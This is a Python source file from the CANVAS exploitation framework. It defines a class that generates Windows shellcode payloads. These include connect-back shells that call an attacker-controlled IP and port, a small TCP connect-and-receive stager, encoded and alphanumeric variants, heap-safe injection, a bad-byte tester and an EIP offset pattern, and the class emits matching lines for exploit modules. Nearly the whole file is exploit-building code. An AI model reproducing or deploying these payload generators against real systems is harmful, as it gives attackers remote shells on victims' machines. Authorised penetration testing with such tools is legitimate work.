#! /usr/bin/env python


#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002
#http://www.immunityinc.com/CANVAS/ for more information


from MOSDEF import mosdef
from tcpexploit import tcpexploit
from toolbar import FakeCallback
import sys, string
import exploitutils


class Win32Shellcode:
  def __init__(self, badstring,knownDict,args):
    self.shell_dicc={"Win32Peek": self.createWin32Peek,
                     "Win32ThreadCallbackShellcode" : self.createWin32ThreadCallbackShellcode,
                     "Win32Shellcode": self.createWin32Shellcode,
                     "SmallWin32Shellcode": self.createSmallWin32Shellcode,
                     "AlphaSmallWin32Shellcode" : self.createAlphaSmallWin32Shellcode,
                     "HeapSafeInject": self.createHeapSafeInject,
                     "KnownWin32Shellcode":self.createKnownWin32Shellcode,
                     "Debug": self.createDebug,\
                     "TestShellcode":self.createTestShellcode,
                     "MessageBox": self.createMessageBox,
                     "FindOffset": self.FindOffset,
                   }
    
    self.tcpexploit = tcpexploit()
    self.bad = badstring
    if "offset_length" in args:
      self.offset_length=args["offset_length"]

    self.start_character=int(args.get("start_character",0))
    self.finish_character=int(args.get("finish_character",256))
    try:
      badstring=badstring.decode("string_escape")    
    except ValueError:
      #they had a trailing \ or some other weird character.
      print "WARNING: Failed to parse badstring: %s"%badstring
      #should do a pop-up or something else here.
      badstring = "" #failed to parse badstring

      
    #exec 'badstring ="""'+ badstring + '"""'
    
    self.tcpexploit.badstring = badstring
    
    self.tcpexploit.callback = FakeCallback()
    if "MYWIN" in knownDict:
      self.known = knownDict['MYWIN']
    
    return 
  
  def getShellcodeSize(self):
    try:
      return len(self.tcpexploit.shellcode)
    except:
      try:
        return len(self.shellcode)
      except:
        return 0
    
  def createPython(self, code):
    try:
      self.code = code
      return self.shell_dicc[code]()
    except KeyError:
      return ''
    
  def getShellcodes(self):
    return self.shell_dicc.keys()
    
  def createWin32Peek(self):
    self.tcpexploit.createWin32Peek()
    return ["self.badstring=badstring\n","self.createWin32Peek()\n"]
    
  def createWin32ThreadCallbackShellcode(self):
    self.tcpexploit.createWin32ThreadCallbackShellcode()
    return ["self.badstring=badstring\n","self.createWin32ThreadCallbackShellcode()\n"]
      
  def createWin32Shellcode(self):
    if len(self.tcpexploit.badstring) != 0:
      print  "Bad Characters: (%s)" %   repr(self.tcpexploit.badstring)
    else:
      print  "(No bad characters found)"
    self.tcpexploit.createWin32Shellcode( self.tcpexploit.badstring, self.tcpexploit.callback.ip,\
                                          self.tcpexploit.callback.port)
    shellcode=self.tcpexploit.shellcode
    #now we need to pad this out to a modulus of 40
    #this is because it tends to vary a bit in size
    padlength=(40-len(shellcode)%40)
    shellcode+="A"*padlength
    
    print len(self.tcpexploit.shellcode)
    return ["self.log('creating Win32 shellcode (badstring: %s callback: %s:%d)' % (prettyprint(badstring), self.localhost, self.localport))\n" ,\
      "self.createWin32Shellcode(badstring, self.localhost, self.localport)\n"]
  
  def createKnownWin32Shellcode(self):
    self.vscreateKnownWin32Shellcode(self.tcpexploit.badstring,self.known, self.tcpexploit.callback.ip,self.tcpexploit.callback.port,0)
    print len(self.shellcode)
    s,c,r=self.known
    buf=["known=[0x%8.8x,0x%8.8x,0x%8.8x]\n"%(s,c,r)]
    buf+=['self.badstring=badstring\n']
    buf+= ["self.createKnownWin32Shellcode(known, self.localhost, self.localport,0)\n"]
    return buf
  
  def createTestShellcode(self):
    """
    Useful for creating a check-for-bad-bytes shellcode
    We have a start and finish character because this will determine the size of our test shellcode
    """
    start=self.start_character
    end=self.finish_character
    #debug print
    #print "createTestShellcode: %d->%d"%(start,end)
    self.tcpexploit.createTestShellcode(start,end)
    return ["self.badstring=badstring\n","self.createTestShellcode(%d,%d)\n"%(start,end)]

  def FindOffset(self):
    """
    This shellcode uses self.offset_length to create a string that looks like: 0xcccccc01 0xcccccc02 0xcccccc03
    and so on. That way when EIP=0xcccccc02 you know the offset is 4. These numbers can be plugged into the VS
    calculator and it will automatically know your offset.
    """
    self.tcpexploit.shellcode=exploitutils.searchpattern(self.offset_length,badchars=self.tcpexploit.badstring)
    return ["self.shellcode = searchpattern(%d,badchars=badstring)\n"%self.offset_length]
  
  def createMessageBox(self):
    self.tcpexploit.createMessageBoxShellcode()
    return ["self.badstring=badstring\n","self.createMessageBoxShellcode()\n"]
  
  def createSmallWin32Shellcode(self):
    self.tcpexploit.createSmallWin32Shellcode( self.tcpexploit.callback.ip,self.tcpexploit.callback.port,0)
    print len(self.tcpexploit.shellcode)
    return ["self.badstring=%r\n"%self.bad.decode('string_escape'),"self.createSmallWin32Shellcode(self.localhost, self.localport,0)\n"]
   
  def createAlphaSmallWin32Shellcode(self):
    self.tcpexploit.createAlphaSmallWin32Shellcode(self.tcpexploit.callback.ip, self.tcpexploit.callback.port)
    print len(self.tcpexploit.shellcode)
    return ["self.createAlphaSmallWin32Shellcode(self.localhost, self.localport)\n"]

  def createHeapSafeInject(self):
    self.tcpexploit.createHeapSafeInject( self.tcpexploit.badstring, self.tcpexploit.callback.ip,\
                                          self.tcpexploit.callback.port)
    return ["self.createHeapSafeInject(badstring, self.localhost, self.localport)\n"]
    
  def createDebug(self):
    self.tcpexploit.shellcode = mosdef.assemble("int $3", "X86")
    return ['self.shellcode = mosdef.assemble("int $3", "X86")\n']
    
  
  def vscreateKnownWin32Shellcode(self,badchars,known,host,port,subesp=0):
        """
        Used from VS, badchars are received.
        Creates a very small shellcode that is SP+Lang dependant
        
        check the top of win32knownshellcodegenerator for valid values of known
        """
        from shellcode.win32knownshellcodegenerator import win32Known
        from encoder import addencoder
        myobj=win32Known()
        self.badstring=badchars
        myobj.badstring=self.badstring
        myobj.knownSP(known)
        myobj.addAttr("findeipnoesp",{"subespval": subesp}) #don't mess with eip
        myobj.addAttr("smalltcpconnect",{"port": port,"ipaddress": host})
        myobj.addAttr("smallrecv",None)
        myobj.addAttr("NoExit",None)
        #self.addAttr("initstackswap",None)
        #self.addAttr("stackSwap",None)
        ret=myobj.get()    
        #import encoder
        encoder= addencoder.inteladdencoder()
        encoder.setbadstring(self.badstring)
        encodedshellcode=encoder.encode(ret)
        self.shellcode=encodedshellcode
        return
      
